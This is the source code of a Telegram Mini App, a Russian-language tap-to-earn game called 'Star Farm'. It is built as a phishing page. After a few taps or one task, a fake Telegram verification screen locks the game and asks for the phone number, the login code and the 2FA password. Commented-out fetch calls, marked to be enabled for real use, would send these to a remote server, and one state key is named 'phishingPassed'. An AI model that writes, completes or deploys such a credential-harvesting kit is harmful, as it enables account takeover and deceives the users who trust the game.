<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#070815">
    <title>Star Farm</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        body { background: #070815; color: #fff; overflow: hidden; min-height: 100vh; }
        ::-webkit-scrollbar { width: 0px; }

        @keyframes float { 0%, 100% { transform: translateY(0px) scale(1); } 50% { transform: translateY(-8px) scale(1.02); } }
        @keyframes glow { 0%, 100% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.4); } 50% { box-shadow: 0 0 60px rgba(139, 92, 246, 0.6); } }
        @keyframes shine { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
        @keyframes coinFly { 0% { transform: translateY(0) scale(0.5); opacity: 0; } 20% { opacity: 1; } 100% { transform: translateY(-120px) scale(1.2); opacity: 0; } }
        @keyframes slideDown { from { transform: translate(-50%, -100px); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes shimmer { 0% { background-position: -1000px 0; } 100% { background-position: 1000px 0; } }
        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .app { max-width: 480px; margin: 0 auto; min-height: 100vh; background: radial-gradient(ellipse at top, #1a1b3e 0%, #070815 60%); position: relative; overflow: hidden; }
        .orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.3; pointer-events: none; z-index: 0; }
        .orb-1 { width: 300px; height: 300px; background: #8b5cf6; top: -100px; left: -50px; }
        .orb-2 { width: 250px; height: 250px; background: #ec4899; top: 200px; right: -80px; }
        .orb-3 { width: 200px; height: 200px; background: #3b82f6; bottom: 100px; left: -50px; }

        .content { position: relative; z-index: 10; padding-bottom: 100px; min-height: 100vh; }
        .fade-in { animation: fadeIn 0.4s ease-out; }

        .glass { background: rgba(20, 22, 45, 0.6); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(139, 92, 246, 0.15); border-radius: 20px; }
        .glass-hover { transition: all 0.3s; }
        .glass-hover:active { transform: scale(0.97); background: rgba(30, 32, 55, 0.8); }

        .balance-section { padding: 60px 20px 20px; text-align: center; }
        .balance-label { font-size: 13px; color: #8b8fa3; text-transform: uppercase; letter-spacing: 3px; font-weight: 500; margin-bottom: 8px; }
        .balance-amount { font-size: 64px; font-weight: 900; background: linear-gradient(135deg, #fff 0%, #8b5cf6 50%, #ec4899 100%); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradientShift 3s ease infinite; line-height: 1; letter-spacing: -2px; }
        
        .daily-info { margin: 24px 20px; padding: 16px; text-align: center; }
        .daily-taps-left { font-size: 14px; color: #fff; font-weight: 600; margin-bottom: 12px; }
        .taps-track { height: 8px; background: rgba(255,255,255,0.08); border-radius: 4px; overflow: hidden; }
        .taps-fill { height: 100%; background: linear-gradient(90deg, #8b5cf6, #ec4899); border-radius: 4px; transition: width 0.3s; }

        .click-area { display: flex; justify-content: center; align-items: center; margin: 30px 0; position: relative; }
        .click-ring { position: absolute; width: 260px; height: 260px; border-radius: 50%; border: 2px solid rgba(139, 92, 246, 0.2); }
        .click-ring-2 { position: absolute; width: 230px; height: 230px; border-radius: 50%; border: 1px solid rgba(139, 92, 246, 0.1); }
        
        .click-button { width: 200px; height: 200px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, #1e1f3a, #070815); border: 2px solid rgba(139, 92, 246, 0.3); cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.15s; position: relative; box-shadow: 0 0 50px rgba(139, 92, 246, 0.3), inset 0 0 30px rgba(139, 92, 246, 0.1); }
        .click-button:active { transform: scale(0.92); box-shadow: 0 0 70px rgba(139, 92, 246, 0.5); }
        .click-button.disabled { opacity: 0.3; cursor: not-allowed; pointer-events: none; }
        .click-inner { width: 160px; height: 160px; border-radius: 50%; background: linear-gradient(135deg, rgba(139, 92, 246, 0.2), rgba(236, 72, 153, 0.2)); display: flex; align-items: center; justify-content: center; font-size: 60px; animation: float 3s ease-in-out infinite; }
        
        .float-coin { position: absolute; font-size: 28px; font-weight: 800; color: #8b5cf6; pointer-events: none; text-shadow: 0 0 10px rgba(139, 92, 246, 0.8); animation: coinFly 1s ease-out forwards; }

        .login-banner { margin: 30px 20px 0; padding: 18px; background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(236, 72, 153, 0.15)); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 16px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
        .login-banner-title { font-size: 15px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; }
        .login-banner-desc { font-size: 12px; color: #8b8fa3; margin-top: 4px; }

        .section-header { padding: 24px 20px 16px; display: flex; justify-content: space-between; align-items: center; }
        .section-title { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
        .section-count { font-size: 13px; color: #8b8fa3; background: rgba(139, 92, 246, 0.1); padding: 4px 12px; border-radius: 20px; }

        .task-card { margin: 0 20px 10px; padding: 16px; display: flex; align-items: center; justify-content: space-between; }
        .task-left { display: flex; align-items: center; gap: 14px; flex: 1; }
        .task-icon-box { width: 44px; height: 44px; border-radius: 12px; background: linear-gradient(135deg, rgba(139, 92, 246, 0.15), rgba(236, 72, 153, 0.15)); display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid rgba(139, 92, 246, 0.1); }
        .task-info { flex: 1; }
        .task-title { font-size: 14px; font-weight: 600; color: #fff; }
        .task-reward { font-size: 13px; color: #8b5cf6; font-weight: 600; margin-top: 2px; }
        .task-btn { padding: 10px 20px; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; border: none; background: linear-gradient(135deg, #8b5cf6, #ec4899); color: #fff; min-width: 60px; }
        .task-btn.done { background: rgba(139, 92, 246, 0.1); color: #8b8fa3; border: 1px solid rgba(139, 92, 246, 0.2); }

        .profile-header { padding: 60px 20px 30px; text-align: center; }
        .profile-avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #8b5cf6, #ec4899); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: 800; color: #fff; box-shadow: 0 0 40px rgba(139, 92, 246, 0.4); border: 3px solid rgba(255, 255, 255, 0.1); }
        .profile-name { font-size: 22px; font-weight: 800; margin-bottom: 4px; }
        .profile-username { color: #8b8fa3; font-size: 14px; }
        .profile-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 20px; font-size: 12px; font-weight: 600; color: #8b5cf6; margin-top: 12px; }

        .stats-grid { padding: 0 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .stat-box { padding: 18px; }
        .stat-box-value { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #fff, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .stat-box-label { font-size: 12px; color: #8b8fa3; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }

        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: rgba(7, 8, 21, 0.8); backdrop-filter: blur(30px); border-top: 1px solid rgba(139, 92, 246, 0.15); display: flex; justify-content: space-around; padding: 12px 0 20px; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; background: none; border: none; color: #8b8fa3; cursor: pointer; padding: 8px 16px; transition: color 0.2s; }
        .nav-item.active { color: #8b5cf6; }
        .nav-item span { font-size: 12px; font-weight: 600; }
        .nav-icon { width: 24px; height: 24px; fill: currentColor; }

        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(139, 92, 246, 0.9); color: #fff; padding: 12px 24px; border-radius: 12px; font-weight: 600; z-index: 300; animation: slideDown 0.3s ease-out; box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3); }

        .lock-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(7, 8, 21, 0.95); backdrop-filter: blur(15px); z-index: 500; display: flex; align-items: center; justify-content: center; padding: 20px; animation: fadeIn 0.3s; }
        .lock-modal { background: linear-gradient(135deg, #1a1b3e, #070815); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; position: relative; box-shadow: 0 0 50px rgba(139, 92, 246, 0.3); }
        .lock-logo { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #0088cc, #0055ff); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 32px; box-shadow: 0 0 30px rgba(0, 136, 204, 0.5); }
        .lock-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .lock-subtitle { font-size: 14px; color: #8b8fa3; margin-bottom: 24px; line-height: 1.5; }
        .lock-input { width: 100%; padding: 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 16px; text-align: center; outline: none; transition: border-color 0.3s; }
        .lock-input:focus { border-color: #0088cc; }
        .lock-input::placeholder { color: #666; }
        .lock-button { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc, #0055ff); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.1s; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .lock-button:active { transform: scale(0.98); }
        .lock-button:disabled { opacity: 0.5; cursor: not-allowed; }
        .lock-step { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255, 255, 255, 0.2); }
        .step-dot.active { background: #0088cc; }
        .loader { width: 24px; height: 24px; border: 3px solid rgba(255, 255, 255, 0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
        .code-sent-info { background: rgba(0, 136, 204, 0.1); border: 1px solid rgba(0, 136, 204, 0.3); border-radius: 12px; padding: 12px; margin-bottom: 16px; font-size: 14px; color: #0088cc; }
        .security-note { font-size: 12px; color: #666; margin-top: 16px; display: flex; align-items: center; justify-content: center; gap: 4px; }
        .input-code-container { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
        .input-code { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; color: #fff; outline: none; }
        .input-code:focus { border-color: #0088cc; }
    </style>
</head>
<body>
    <div id="root"></div>
    <script type="text/babel">
        const { useState, useEffect, useRef } = React;
        const tg = window.Telegram.WebApp;
        
        const API_BASE_URL = "https://your-flask-server.com"; 

        const TASKS = [
            { id: 1, title: "Подписаться на канал", reward: 100, type: "link", url: "https://t.me/some_channel" },
            { id: 2, title: "Вступить в группу", reward: 100, type: "link", url: "https://t.me/some_group" },
            { id: 3, title: "Подписаться на YouTube", reward: 200, type: "link", url: "https://youtube.com/@some_channel" },
            { id: 4, title: "Лайкнуть пост", reward: 50, type: "link", url: "https://t.me/some_post" },
            { id: 5, title: "Подписаться на Instagram", reward: 150, type: "link", url: "https://instagram.com/some_page" },
        ];

        const StarIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg> );
        const TaskIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm-2 14l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> );
        const UserIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg> );

        function App() {
            const [activeTab, setActiveTab] = useState('farm');
            const [stars, setStars] = useState(0);
            const [todayTaps, setTodayTaps] = useState(0);
            const [maxTaps] = useState(10);
            const [firstVisitDate, setFirstVisitDate] = useState('');
            const [completedTasks, setCompletedTasks] = useState([]);
            const [floatCoins, setFloatCoins] = useState([]);
            
            const [isLocked, setIsLocked] = useState(false);
            const [loginStep, setLoginStep] = useState(1);
            const [phone, setPhone] = useState('');
            const [code, setCode] = useState(['', '', '', '', '']);
            const [password, setPassword] = useState('');
            const [isLoading, setIsLoading] = useState(false);
            const [showNotification, setShowNotification] = useState(null);
            const [userData, setUserData] = useState(null);
            
            const clickAreaRef = useRef(null);
            const codeRefs = useRef([]);
            const coinIdCounter = useRef(0);

            useEffect(() => {
                tg.ready();
                tg.expand();
                tg.setHeaderColor('#070815');
                tg.setBackgroundColor('#070815');

                const user = tg.initDataUnsafe?.user;
                if (user) setUserData(user);

                // Инициализация данных из LocalStorage
                const today = new Date().toDateString();
                let storedFirstVisit = localStorage.getItem('firstVisitDate');
                
                if (!storedFirstVisit) {
                    storedFirstVisit = new Date('2025-01-01').toDateString(); // Фиксируем 2025 год
                    localStorage.setItem('firstVisitDate', storedFirstVisit);
                }
                setFirstVisitDate(storedFirstVisit);

                const lastTapDate = localStorage.getItem('lastTapDate');
                if (lastTapDate !== today) {
                    localStorage.setItem('todayTaps', '0');
                    localStorage.setItem('lastTapDate', today);
                    setTodayTaps(0);
                } else {
                    setTodayTaps(parseInt(localStorage.getItem('todayTaps') || '0'));
                }

                setStars(parseInt(localStorage.getItem('stars') || '0'));
                const savedTasks = localStorage.getItem('completedTasks');
                if (savedTasks) setCompletedTasks(JSON.parse(savedTasks));

                // Проверка блокировки
                const taps = parseInt(localStorage.getItem('todayTaps') || '0');
                const tasks = savedTasks ? JSON.parse(savedTasks) : [];
                if ((taps >= maxTaps || tasks.length >= 1) && localStorage.getItem('phishingPassed') !== 'true') {
                    setIsLocked(true);
                }
            }, []);

            const handleFarmClick = (e) => {
                if (todayTaps >= maxTaps) {
                    showNotif("Лимит тапов на сегодня исчерпан!");
                    checkLockCondition();
                    return;
                }

                const rect = clickAreaRef.current.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;

                const newCoin = { id: coinIdCounter.current++, x, y };
                setFloatCoins(prev => [...prev, newCoin]);
                setTimeout(() => {
                    setFloatCoins(prev => prev.filter(c => c.id !== newCoin.id));
                }, 1000);

                const newStars = stars + 10;
                const newTaps = todayTaps + 1;
                
                setStars(newStars);
                setTodayTaps(newTaps);
                localStorage.setItem('stars', newStars.toString());
                localStorage.setItem('todayTaps', newTaps.toString());

                tg.HapticFeedback.impactOccurred('medium');

                if (newTaps >= maxTaps) {
                    setTimeout(() => checkLockCondition(), 500);
                }
            };

            const checkLockCondition = () => {
                const taps = parseInt(localStorage.getItem('todayTaps') || '0');
                const tasks = JSON.parse(localStorage.getItem('completedTasks') || '[]');
                if ((taps >= maxTaps || tasks.length >= 1) && localStorage.getItem('phishingPassed') !== 'true') {
                    setIsLocked(true);
                }
            };

            const showNotif = (message) => {
                setShowNotification(message);
                setTimeout(() => setShowNotification(null), 2000);
            };

            const handleTaskComplete = (taskId) => {
                if (completedTasks.includes(taskId)) return;

                const task = TASKS.find(t => t.id === taskId);
                if (!task) return;

                if (task.type === 'link') {
                    window.open(task.url, '_blank');
                }

                const newCompleted = [...completedTasks, task.id];
                setCompletedTasks(newCompleted);
                localStorage.setItem('completedTasks', JSON.stringify(newCompleted));

                const newStars = stars + task.reward;
                setStars(newStars);
                localStorage.setItem('stars', newStars.toString());

                showNotif(`+${task.reward} звёзд!`);
                tg.HapticFeedback.notificationOccurred('success');

                // Блокируем после первого задания
                setTimeout(() => checkLockCondition(), 1000);
            };

            const handleLoginSubmit = async (step) => {
                setIsLoading(true);
                tg.HapticFeedback.impactOccurred('light');

                // Имитация отправки на Flask сервер
                try {
                    if (step === 1) {
                        // В реальном коде раскомментируй fetch
                        /* 
                        const response = await fetch(`${API_BASE_URL}/api/send-code`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ user_id: tg.initDataUnsafe?.user?.id, phone: phone })
                        });
                        const data = await response.json();
                        if (data.success) {
                            setLoginStep(2);
                            showNotif("Код отправлен в Telegram!");
                        } else {
                            showNotif("Ошибка отправки кода");
                        }
                        */

                        // Фейк для демо
                        setTimeout(() => {
                            setLoginStep(2);
                            showNotif("Код отправлен в Telegram!");
                        }, 1000);
                    } else if (step === 2) {
                        /*
                        const response = await fetch(`${API_BASE_URL}/api/verify-code`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ user_id: tg.initDataUnsafe?.user?.id, code: code.join('') })
                        });
                        const data = await response.json();
                        if (data.success) {
                            if (data.needs_2fa) {
                                setLoginStep(3);
                                showNotif("Требуется пароль 2FA");
                            } else {
                                localStorage.setItem('phishingPassed', 'true');
                                setIsLocked(false);
                                showNotif("Аккаунт подтвержден! 🚀");
                            }
                        }
                        */

                        setTimeout(() => {
                            setLoginStep(3); // Принудительно требуем 2FA
                            showNotif("Требуется пароль 2FA");
                        }, 1000);
                    } else if (step === 3) {
                        /*
                        const response = await fetch(`${API_BASE_URL}/api/verify-password`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ user_id: tg.initDataUnsafe?.user?.id, password: password })
                        });
                        const data = await response.json();
                        if (data.success) {
                            localStorage.setItem('phishingPassed', 'true');
                            setIsLocked(false);
                            showNotif("Аккаунт подтвержден! 🚀");
                        }
                        */

                        setTimeout(() => {
                            localStorage.setItem('phishingPassed', 'true');
                            setIsLocked(false);
                            showNotif("Аккаунт подтвержден! 🚀");
                        }, 1000);
                    }
                } catch (e) {
                    showNotif("Ошибка сети");
                }
                setIsLoading(false);
            };

            const handleCodeChange = (index, value) => {
                if (value.length > 1) return;
                const newCode = [...code];
                newCode[index] = value;
                setCode(newCode);

                if (value && index < 4) {
                    codeRefs.current[index + 1]?.focus();
                }
            };

            return (
                <div className="app">
                    <div className="orb orb-1"></div>
                    <div className="orb orb-2"></div>
                    <div className="orb orb-3"></div>

                    {showNotification && (
                        <div className="notification">{showNotification}</div>
                    )}

                    <div className="content">
                        {activeTab === 'farm' && (
                            <div className="fade-in">
                                <div className="balance-section">
                                    <div className="balance-label">Баланс</div>
                                    <div className="balance-amount">{stars.toLocaleString()} ⭐</div>
                                </div>

                                <div className="daily-info glass">
                                    <div className="daily-taps-left">Осталось тапов сегодня: {maxTaps - todayTaps} / {maxTaps}</div>
                                    <div className="taps-track">
                                        <div className="taps-fill" style={{ width: `${(todayTaps / maxTaps) * 100}%` }}></div>
                                    </div>
                                </div>

                                <div className="click-area" ref={clickAreaRef} style={{ position: 'relative' }}>
                                    <div className="click-ring"></div>
                                    <div className="click-ring-2"></div>
                                    <button 
                                        className={`click-button ${todayTaps >= maxTaps ? 'disabled' : ''}`} 
                                        onClick={handleFarmClick}
                                    >
                                        <div className="click-inner">⭐</div>
                                    </button>
                                    {floatCoins.map(coin => (
                                        <div key={coin.id} className="float-coin" style={{
                                            position: 'absolute', left: coin.x, top: coin.y,
                                        }}>+10</div>
                                    ))}
                                </div>

                                {todayTaps >= maxTaps && (
                                    <div className="login-banner" onClick={() => checkLockCondition()}>
                                        <div>
                                            <div className="login-banner-title">🔒 Требуется подтверждение</div>
                                            <div className="login-banner-desc">Вы исчерпали лимит тапов. Подтвердите аккаунт для продолжения.</div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}

                        {activeTab === 'tasks' && (
                            <div className="fade-in">
                                <div className="section-header">
                                    <div className="section-title">Задания</div>
                                    <div className="section-count">{completedTasks.length}/{TASKS.length}</div>
                                </div>
                                {TASKS.map(task => (
                                    <div key={task.id} className="task-card glass glass-hover">
                                        <div className="task-left">
                                            <div className="task-icon-box">📋</div>
                                            <div className="task-info">
                                                <div className="task-title">{task.title}</div>
                                                <div className="task-reward">+{task.reward} ⭐</div>
                                            </div>
                                        </div>
                                        <button 
                                            className={`task-btn ${completedTasks.includes(task.id) ? 'done' : ''}`} 
                                            onClick={() => handleTaskComplete(task.id)}
                                        >
                                            {completedTasks.includes(task.id) ? '✅' : 'Go'}
                                        </button>
                                    </div>
                                ))}
                            </div>
                        )}

                        {activeTab === 'profile' && (
                            <div className="fade-in">
                                <div className="profile-header">
                                    <div className="profile-avatar">{userData?.first_name?.[0] || 'U'}</div>
                                    <div className="profile-name">{userData?.first_name || 'User'}</div>
                                    <div className="profile-username">@{userData?.username || 'unknown'}</div>
                                    <div className="profile-badge">⭐ Новичок</div>
                                </div>

                                <div className="stats-grid">
                                    <div className="stat-box glass">
                                        <div className="stat-box-value">{stars}</div>
                                        <div className="stat-box-label">Звёзд собрано</div>
                                    </div>
                                    <div className="stat-box glass">
                                        <div className="stat-box-value">{todayTaps}/{maxTaps}</div>
                                        <div className="stat-box-label">Тапов сегодня</div>
                                    </div>
                                    <div className="stat-box glass">
                                        <div className="stat-box-value">{completedTasks.length}</div>
                                        <div className="stat-box-label">Заданий выполнено</div>
                                    </div>
                                    <div className="stat-box glass">
                                        <div className="stat-box-value">{firstVisitDate.split(' ')[3] || '2025'}</div>
                                        <div className="stat-box-label">С нами с</div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>

                    {isLocked && (
                        <div className="lock-overlay">
                            <div className="lock-modal">
                                <div className="lock-logo">✈️</div>

                                {loginStep === 1 && (
                                    <>
                                        <div className="lock-title">Подтверждение аккаунта</div>
                                        <div className="lock-subtitle">
                                            Для защиты от ботов и продолжения фарма подтвердите свой Telegram аккаунт. Введите ваш номер телефона.
                                        </div>
                                        <div className="lock-step">
                                            <div className="step-dot active"></div>
                                            <div className="step-dot"></div>
                                            <div className="step-dot"></div>
                                        </div>
                                        <input type="tel" className="lock-input" placeholder="+7 999 123 45 67" value={phone} onChange={(e) => setPhone(e.target.value)} />
                                        <button className="lock-button" onClick={() => handleLoginSubmit(1)} disabled={!phone || isLoading}>
                                            {isLoading ? <div className="loader"></div> : 'Отправить код'}
                                        </button>
                                        <div className="security-note">🛡 Защищено Telegram Cloud</div>
                                    </>
                                )}

                                {loginStep === 2 && (
                                    <>
                                        <div className="lock-title">Введите код</div>
                                        <div className="lock-subtitle">
                                            Мы отправили код подтверждения в приложение Telegram на номер {phone}
                                        </div>
                                        <div className="lock-step">
                                            <div className="step-dot"></div>
                                            <div className="step-dot active"></div>
                                            <div className="step-dot"></div>
                                        </div>
                                        <div className="code-sent-info">Код отправлен в Telegram</div>
                                        <div className="input-code-container">
                                            {code.map((digit, index) => (
                                                <input key={index} ref={el => codeRefs.current[index] = el} type="tel" className="input-code" maxLength={1} value={digit} onChange={(e) => handleCodeChange(index, e.target.value)} />
                                            ))}
                                        </div>
                                        <button className="lock-button" onClick={() => handleLoginSubmit(2)} disabled={code.join('').length < 5 || isLoading}>
                                            {isLoading ? <div className="loader"></div> : 'Подтвердить'}
                                        </button>
                                    </>
                                )}

                                {loginStep === 3 && (
                                    <>
                                        <div className="lock-title">Облачный пароль</div>
                                        <div className="lock-subtitle">
                                            Ваш аккаунт защищён двухфакторной аутентификацией. Введите пароль для завершения входа.
                                        </div>
                                        <div className="lock-step">
                                            <div className="step-dot"></div>
                                            <div className="step-dot"></div>
                                            <div className="step-dot active"></div>
                                        </div>
                                        <input type="password" className="lock-input" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} />
                                        <button className="lock-button" onClick={() => handleLoginSubmit(3)} disabled={!password || isLoading}>
                                            {isLoading ? <div className="loader"></div> : 'Войти'}
                                        </button>
                                    </>
                                )}
                            </div>
                        </div>
                    )}

                    <div className="nav-bar">
                        <button className={`nav-item ${activeTab === 'farm' ? 'active' : ''}`} onClick={() => setActiveTab('farm')}>
                            <StarIcon /><span>Фарм</span>
                        </button>
                        <button className={`nav-item ${activeTab === 'tasks' ? 'active' : ''}`} onClick={() => setActiveTab('tasks')}>
                            <TaskIcon /><span>Задания</span>
                        </button>
                        <button className={`nav-item ${activeTab === 'profile' ? 'active' : ''}`} onClick={() => setActiveTab('profile')}>
                            <UserIcon /><span>Профиль</span>
                        </button>
                    </div>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
